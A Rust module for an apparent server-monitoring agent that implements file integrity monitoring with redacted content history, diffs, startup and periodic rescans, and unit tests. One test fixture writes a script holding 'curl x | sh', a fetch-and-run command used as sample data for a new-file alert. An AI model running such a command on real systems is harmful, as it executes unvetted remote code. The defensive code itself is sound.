//! File integrity monitoring with content history.
//!
//! Hash-only FIM says "sshd_config changed". That's where most tools
//! stop — and where the investigation actually starts. For text files
//! (configs, scripts, crontabs, authorized_keys) we keep the content, so
//! every change comes with a diff against the previous version and the
//! previous version itself stays retrievable (`server-sentinel diff`).
//!
//! - Real-time via inotify / ReadDirectoryChangesW (`notify` crate),
//!   debounced so an editor's write-rename-chmod dance is one change.
//! - Full rescan at startup (changes made *while the agent was stopped*
//!   are still caught) and periodically (in case the OS dropped events).
//! - Secrets: files matching `content_exclude` (private keys, shadow)
//!   are hash-only; everything else is stored redacted.

use crate::core::config::FimConfig;
use crate::events::{Category, Event, EventBus, Outcome, Severity};
use crate::security::redact::Redactor;
use crate::storage::event_store::{EventStore, FimRecord};
use crate::util::{expand_path_pattern, is_text, sha256_hex, truncate, wildcard_match};
use anyhow::Result;
use notify::{RecursiveMode, Watcher};
use similar::{ChangeTag, TextDiff};
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{channel, RecvTimeoutError};
use std::sync::Arc;
use std::thread::JoinHandle;
use std::time::{Duration, Instant, UNIX_EPOCH};

const MAX_DIFF_BYTES: usize = 16 * 1024;

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Source {
    Watch,
    Scan,
    Startup,
}

impl Source {
    fn as_str(self) -> &'static str {
        match self {
            Source::Watch => "realtime",
            Source::Scan => "periodic scan",
            Source::Startup => "startup scan (changed while the agent was not running)",
        }
    }
}

pub struct Fim {
    cfg: FimConfig,
    db: EventStore,
    redactor: Redactor,
    roots: Vec<PathBuf>,
    tracked: usize,
    warned_cap: bool,
}

fn mtime_secs(m: &std::fs::Metadata) -> i64 {
    m.modified()
        .ok()
        .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0)
}

#[cfg(unix)]
fn mode_uid(m: &std::fs::Metadata) -> (Option<u32>, Option<u32>) {
    use std::os::unix::fs::MetadataExt;
    (Some(m.mode() & 0o7777), Some(m.uid()))
}

#[cfg(not(unix))]
fn mode_uid(m: &std::fs::Metadata) -> (Option<u32>, Option<u32>) {
    (Some(if m.permissions().readonly() { 1 } else { 0 }), None)
}

pub struct Diff {
    pub text: String,
    pub added: usize,
    pub removed: usize,
    pub truncated: bool,
}

pub fn unified_diff(old: &str, new: &str, path: &str) -> Diff {
    let diff = TextDiff::from_lines(old, new);
    let (mut added, mut removed) = (0, 0);
    for c in diff.iter_all_changes() {
        match c.tag() {
            ChangeTag::Insert => added += 1,
            ChangeTag::Delete => removed += 1,
            ChangeTag::Equal => {}
        }
    }
    let text = diff
        .unified_diff()
        .context_radius(3)
        .header(&format!("{path} (before)"), &format!("{path} (after)"))
        .to_string();
    let truncated = text.len() > MAX_DIFF_BYTES;
    Diff {
        text: if truncated { truncate(&text, MAX_DIFF_BYTES) } else { text },
        added,
        removed,
        truncated,
    }
}

impl Fim {
    pub fn new(cfg: FimConfig, db: EventStore, redact: bool) -> Self {
        let roots = cfg
            .paths
            .iter()
            // "C:/x" and "C:\x" are the same directory, but mixed separators
            // in reported paths break matching against command lines.
            .map(|p| if cfg!(windows) { p.replace('/', "\\") } else { p.clone() })
            .flat_map(|p| expand_path_pattern(&p))
            .collect();
        Self {
            cfg,
            db,
            redactor: Redactor::new(redact),
            roots,
            tracked: 0,
            warned_cap: false,
        }
    }

    pub fn roots(&self) -> &[PathBuf] {
        &self.roots
    }

    fn excluded(&self, p: &str) -> bool {
        self.cfg.exclude.iter().any(|pat| wildcard_match(pat, p))
    }

    fn content_excluded(&self, p: &str) -> bool {
        self.cfg.content_exclude.iter().any(|pat| wildcard_match(pat, p))
    }

    fn under_roots(&self, p: &Path) -> bool {
        self.roots.iter().any(|r| p.starts_with(r))
    }

    /// Walks every root. `baseline_only` (first ever run): record without
    /// emitting events.
    pub fn scan(&mut self, source: Source, baseline_only: bool, emit: &mut dyn FnMut(Event) -> bool) -> Result<bool> {
        let known: HashSet<String> = self.db.fim_paths()?.into_iter().collect();
        let mut seen: HashSet<String> = HashSet::with_capacity(known.len());
        let mut stack: Vec<PathBuf> = self.roots.clone();
        self.tracked = 0;
        self.db.fim_begin()?;
        let result = (|| -> Result<bool> {
            while let Some(p) = stack.pop() {
                let ps = p.display().to_string();
                if self.excluded(&ps) {
                    continue;
                }
                let Ok(meta) = std::fs::symlink_metadata(&p) else { continue };
                if meta.is_dir() {
                    if let Ok(rd) = std::fs::read_dir(&p) {
                        stack.extend(rd.flatten().map(|e| e.path()));
                    }
                    continue;
                }
                if self.tracked >= self.cfg.max_files {
                    if !self.warned_cap {
                        tracing::warn!(max_files = self.cfg.max_files, "file integrity monitoring hit security.fim.max_files; remaining files are not tracked");
                        self.warned_cap = true;
                    }
                    continue;
                }
                self.tracked += 1;
                seen.insert(ps.clone());
                if let Some(ev) = self.check(&p, source, Some(meta))? {
                    if !baseline_only && !emit(ev) {
                        return Ok(false);
                    }
                }
            }
            // Tracked before, gone now.
            for gone in known.difference(&seen) {
                let path = PathBuf::from(gone);
                if !self.under_roots(&path) || self.excluded(gone) {
                    self.db.fim_delete(gone)?; // no longer monitored
                    continue;
                }
                if path.exists() {
                    continue; // e.g. over the max_files cap this time
                }
                if let Some(ev) = self.check(&path, source, None)? {
                    if !baseline_only && !emit(ev) {
                        return Ok(false);
                    }
                }
            }
            Ok(true)
        })();
        self.db.fim_commit()?;
        result
    }

    /// Compares one path against its baseline, updates the baseline, and
    /// returns the change event (if it changed).
    pub fn check(&mut self, path: &Path, source: Source, meta: Option<std::fs::Metadata>) -> Result<Option<Event>> {
        let ps = path.display().to_string();
        if self.excluded(&ps) {
            return Ok(None);
        }
        let prev = self.db.fim_get(&ps)?;
        let meta = match meta.map(Ok).unwrap_or_else(|| std::fs::symlink_metadata(path)) {
            Ok(m) => m,
            Err(_) => {
                let Some(prev) = prev else { return Ok(None) };
                self.db.fim_delete(&ps)?;
                let mut ev = Event::new(Category::File, "file.deleted", format!("Deleted {ps}"))
                    .outcome(Outcome::Success)
                    .target(ps.clone())
                    .detail("size_before", prev.size)
                    .detail("detected_by", source.as_str());
                ev.before_sha = prev.blob_sha.clone();
                if let Some(h) = prev.sha256 {
                    ev.set_detail("sha256_before", h);
                }
                return Ok(Some(ev));
            }
        };
        if meta.is_dir() {
            return Ok(None);
        }

        let is_symlink = meta.file_type().is_symlink();
        let (sha, content): (Option<String>, Option<Vec<u8>>) = if is_symlink {
            let target = std::fs::read_link(path).map(|t| t.display().to_string()).unwrap_or_default();
            let raw = format!("-> {target}\n");
            (Some(sha256_hex(raw.as_bytes())), Some(raw.into_bytes()))
        } else if meta.len() > self.cfg.max_hash_bytes {
            (None, None)
        } else {
            match std::fs::read(path) {
                Ok(bytes) => {
                    let sha = sha256_hex(&bytes);
                    let keep = bytes.len() as u64 <= self.cfg.max_content_bytes && is_text(&bytes) && !self.content_excluded(&ps);
                    let content = keep.then(|| {
                        let text = String::from_utf8_lossy(&bytes);
                        self.redactor.redact(&text).into_bytes()
                    });
                    (Some(sha), content)
                }
                // Locked / permission denied: track what metadata we can.
                Err(_) => (None, None),
            }
        };
        let (mode, uid) = mode_uid(&meta);
        let blob_sha = match &content {
            Some(c) => Some(self.db.put_blob(c)?),
            None => None,
        };
        let rec = FimRecord {
            path: ps.clone(),
            sha256: sha.clone(),
            size: meta.len(),
            mtime: mtime_secs(&meta),
            mode,
            uid,
            blob_sha: blob_sha.clone(),
        };

        let event = match &prev {
            None => {
                let mut ev = Event::new(Category::File, "file.created", format!("Created {ps} ({} bytes)", meta.len()))
                    .outcome(Outcome::Success)
                    .target(ps.clone())
                    .detail("size_after", meta.len())
                    .detail("detected_by", source.as_str());
                ev.after_sha = blob_sha.clone();
                if let Some(h) = &sha {
                    ev.set_detail("sha256_after", h.clone());
                }
                if let Some(c) = &content {
                    let text = String::from_utf8_lossy(c);
                    let d = unified_diff("", &text, &ps);
                    ev.set_detail("diff", d.text);
                    ev.set_detail("lines_added", d.added);
                }
                Some(ev)
            }
            Some(p) => {
                let content_changed = match (&p.sha256, &sha) {
                    (Some(a), Some(b)) => a != b,
                    // No hash on one side (too big / unreadable): fall
                    // back to size + mtime.
                    _ => p.size != rec.size || p.mtime != rec.mtime,
                };
                if content_changed {
                    let mut ev = Event::new(Category::File, "file.modified", format!("Modified {ps}"))
                        .outcome(Outcome::Success)
                        .target(ps.clone())
                        .detail("size_before", p.size)
                        .detail("size_after", rec.size)
                        .detail("detected_by", source.as_str());
                    ev.before_sha = p.blob_sha.clone();
                    ev.after_sha = blob_sha.clone();
                    if let (Some(a), Some(b)) = (&p.sha256, &sha) {
                        ev.set_detail("sha256_before", a.clone());
                        ev.set_detail("sha256_after", b.clone());
                    }
                    let old = p.blob_sha.as_deref().map(|s| self.db.get_blob(s)).transpose()?.flatten();
                    match (old, &content) {
                        (Some(old), Some(new)) => {
                            let d = unified_diff(&String::from_utf8_lossy(&old), &String::from_utf8_lossy(new), &ps);
                            ev.message = format!("Modified {ps} (+{} -{})", d.added, d.removed);
                            ev.set_detail("diff", d.text);
                            ev.set_detail("lines_added", d.added);
                            ev.set_detail("lines_removed", d.removed);
                            if d.truncated {
                                ev.set_detail("diff_truncated", true);
                            }
                        }
                        _ => {
                            let why = if self.content_excluded(&ps) {
                                "content not stored (secret file: hash only)"
                            } else {
                                "binary or large file (hash only)"
                            };
                            ev.set_detail("content", why);
                            ev.message = format!("Modified {ps} ({} -> {} bytes, {why})", p.size, rec.size);
                        }
                    }
                    Some(ev)
                } else if p.mode != rec.mode || p.uid != rec.uid {
                    let mut ev = Event::new(Category::File, "file.permissions_changed", format!("Permissions/owner changed on {ps}"))
                        .outcome(Outcome::Success)
                        .target(ps.clone())
                        .detail("detected_by", source.as_str());
                    if let (Some(a), Some(b)) = (p.mode, rec.mode) {
                        ev.set_detail("mode_before", format!("{a:o}"));
                        ev.set_detail("mode_after", format!("{b:o}"));
                        // World-writable is worth calling out.
                        if cfg!(unix) && b & 0o002 != 0 && a & 0o002 == 0 {
                            ev.severity = Severity::Medium;
                            ev.message = format!("{ps} made world-writable ({a:o} -> {b:o})");
                        }
                    }
                    if p.uid != rec.uid {
                        ev.set_detail("uid_before", p.uid);
                        ev.set_detail("uid_after", rec.uid);
                    }
                    Some(ev)
                } else {
                    None // unchanged (or just touched)
                }
            }
        };
        self.db.fim_put(&rec)?;
        Ok(event)
    }

    /// Everything under a directory that just appeared (mkdir + files
    /// moved in).
    fn check_tree(&mut self, dir: &Path, emit: &mut dyn FnMut(Event) -> bool) -> Result<bool> {
        let mut stack = vec![dir.to_path_buf()];
        while let Some(p) = stack.pop() {
            if self.excluded(&p.display().to_string()) {
                continue;
            }
            match std::fs::symlink_metadata(&p) {
                Ok(m) if m.is_dir() => {
                    if let Ok(rd) = std::fs::read_dir(&p) {
                        stack.extend(rd.flatten().map(|e| e.path()));
                    }
                }
                Ok(m) => {
                    if let Some(ev) = self.check(&p, Source::Watch, Some(m))? {
                        if !emit(ev) {
                            return Ok(false);
                        }
                    }
                }
                Err(_) => {}
            }
        }
        Ok(true)
    }
}

pub fn spawn(cfg: FimConfig, db_path: PathBuf, redact: bool, bus: EventBus, running: Arc<AtomicBool>) -> Result<JoinHandle<()>> {
    let db = EventStore::open(&db_path)?;
    Ok(std::thread::Builder::new().name("audit-fim".into()).spawn(move || {
        if let Err(e) = run(cfg, db, redact, bus, running) {
            tracing::error!(error = %e, "file integrity monitoring stopped");
        }
    })?)
}

fn run(cfg: FimConfig, db: EventStore, redact: bool, bus: EventBus, running: Arc<AtomicBool>) -> Result<()> {
    let debounce = Duration::from_millis(cfg.debounce_ms.max(100));
    let rescan_every = Duration::from_secs(cfg.rescan_interval_seconds.max(60));
    let mut fim = Fim::new(cfg, db, redact);
    if fim.roots().is_empty() {
        tracing::warn!("file integrity monitoring: none of the configured paths exist on this host");
        return Ok(());
    }

    // Start watching *before* the baseline scan so nothing slips between.
    let (tx, rx) = channel::<PathBuf>();
    let mut watcher = notify::recommended_watcher(move |res: notify::Result<notify::Event>| {
        if let Ok(ev) = res {
            for p in ev.paths {
                let _ = tx.send(p);
            }
        }
    })?;
    let mut watched_parents: HashSet<PathBuf> = HashSet::new();
    for root in fim.roots().to_vec() {
        // A single file is watched through its directory: editors, sed -i,
        // vipw and useradd all save by renaming a new file over the old
        // one, which would silently kill a watch on the file itself.
        let (target, mode) = if root.is_dir() {
            (root.clone(), RecursiveMode::Recursive)
        } else {
            match root.parent() {
                Some(parent) if watched_parents.insert(parent.to_path_buf()) => (parent.to_path_buf(), RecursiveMode::NonRecursive),
                Some(_) => continue,
                None => (root.clone(), RecursiveMode::NonRecursive),
            }
        };
        if let Err(e) = watcher.watch(&target, mode) {
            tracing::warn!(path = %target.display(), error = %e, "cannot watch path in real time; relying on periodic rescans");
        }
    }

    let first_run = fim.db.get_state("fim.baselined")?.is_none();
    let started = Instant::now();
    let mut emit = |ev: Event| bus.emit(ev);
    if !fim.scan(Source::Startup, first_run, &mut emit)? {
        return Ok(());
    }
    fim.db.set_state("fim.baselined", &chrono::Utc::now().to_rfc3339())?;
    tracing::info!(
        roots = fim.roots().len(),
        files = fim.tracked,
        elapsed_ms = started.elapsed().as_millis() as u64,
        first_run,
        "file integrity baseline {}",
        if first_run { "recorded" } else { "verified" }
    );

    let mut pending: HashMap<PathBuf, Instant> = HashMap::new();
    let mut last_scan = Instant::now();
    while running.load(Ordering::SeqCst) {
        match rx.recv_timeout(Duration::from_millis(250)) {
            Ok(p) => {
                // Parent-directory watches (see above) also report siblings
                // that aren't monitored.
                if fim.under_roots(&p) {
                    pending.insert(p, Instant::now());
                }
                while let Ok(p) = rx.try_recv() {
                    if fim.under_roots(&p) {
                        pending.insert(p, Instant::now());
                    }
                }
            }
            Err(RecvTimeoutError::Timeout) => {}
            Err(RecvTimeoutError::Disconnected) => break,
        }
        let now = Instant::now();
        let due: Vec<PathBuf> = pending
            .iter()
            .filter(|(_, t)| now.duration_since(**t) >= debounce)
            .map(|(p, _)| p.clone())
            .collect();
        for p in due {
            pending.remove(&p);
            let ok = if p.is_dir() {
                fim.check_tree(&p, &mut emit)?
            } else {
                match fim.check(&p, Source::Watch, None)? {
                    Some(ev) => emit(ev),
                    None => true,
                }
            };
            if !ok {
                return Ok(());
            }
        }
        if last_scan.elapsed() >= rescan_every {
            last_scan = Instant::now();
            if !fim.scan(Source::Scan, false, &mut emit)? {
                return Ok(());
            }
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn fim_for(dir: &Path) -> Fim {
        let cfg = FimConfig {
            paths: vec![dir.display().to_string()],
            ..Default::default()
        };
        Fim::new(cfg, EventStore::open_in_memory().unwrap(), true)
    }

    fn collect(fim: &mut Fim, source: Source, baseline: bool) -> Vec<Event> {
        let mut out = Vec::new();
        fim.scan(source, baseline, &mut |e| {
            out.push(e);
            true
        })
        .unwrap();
        out
    }

    #[test]
    fn baseline_then_modify_with_diff_and_history() {
        let dir = tempfile::tempdir().unwrap();
        let conf = dir.path().join("nginx.conf");
        std::fs::write(&conf, "worker_processes 4;\nlisten 80;\n").unwrap();
        let mut fim = fim_for(dir.path());
        assert!(collect(&mut fim, Source::Startup, true).is_empty(), "first run records silently");

        std::fs::write(&conf, "worker_processes 4;\nlisten 8080;\npassword = hunter2\n").unwrap();
        let ev = fim.check(&conf, Source::Watch, None).unwrap().expect("modified");
        assert_eq!(ev.action, "file.modified");
        let diff = ev.detail_str("diff").unwrap();
        assert!(diff.contains("-listen 80;") && diff.contains("+listen 8080;"), "{diff}");
        assert!(diff.contains("+password = ***") && !diff.contains("hunter2"), "diffs are redacted: {diff}");
        assert_eq!((ev.details["lines_added"].as_u64(), ev.details["lines_removed"].as_u64()), (Some(2), Some(1)));
        // The previous version is retrievable.
        let before = fim.db.get_blob(ev.before_sha.as_deref().unwrap()).unwrap().unwrap();
        assert_eq!(String::from_utf8(before).unwrap(), "worker_processes 4;\nlisten 80;\n");

        assert!(fim.check(&conf, Source::Watch, None).unwrap().is_none(), "no change -> no event");
    }

    #[test]
    fn changes_while_stopped_are_caught_at_startup() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("keep"), "a\n").unwrap();
        std::fs::write(dir.path().join("remove-me"), "b\n").unwrap();
        let mut fim = fim_for(dir.path());
        collect(&mut fim, Source::Startup, true);

        std::fs::remove_file(dir.path().join("remove-me")).unwrap();
        std::fs::create_dir(dir.path().join("sub")).unwrap();
        std::fs::write(dir.path().join("sub").join("new.sh"), "#!/bin/sh\ncurl x | sh\n").unwrap();
        let mut evs = collect(&mut fim, Source::Startup, false);
        evs.sort_by(|a, b| a.action.cmp(&b.action));
        let actions: Vec<&str> = evs.iter().map(|e| e.action.as_str()).collect();
        assert_eq!(actions, vec!["file.created", "file.deleted"]);
        assert!(evs[0].detail_str("detected_by").unwrap().starts_with("startup"));
        assert!(evs[1].before_sha.is_some(), "deleted file's last content is kept");
    }

    #[test]
    fn secrets_are_hash_only_and_excludes_ignored() {
        let dir = tempfile::tempdir().unwrap();
        let key = dir.path().join("server.key");
        std::fs::write(&key, "-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n").unwrap();
        std::fs::write(dir.path().join("x.swp"), "junk").unwrap();
        let mut fim = fim_for(dir.path());
        collect(&mut fim, Source::Startup, true);
        std::fs::write(&key, "-----BEGIN PRIVATE KEY-----\nxyz\n-----END PRIVATE KEY-----\n").unwrap();
        let ev = fim.check(&key, Source::Watch, None).unwrap().unwrap();
        assert!(ev.detail_str("diff").is_none() && ev.before_sha.is_none() && ev.after_sha.is_none());
        assert!(ev.message.contains("hash only"));
        assert!(fim.check(&dir.path().join("x.swp"), Source::Watch, None).unwrap().is_none());
    }
}
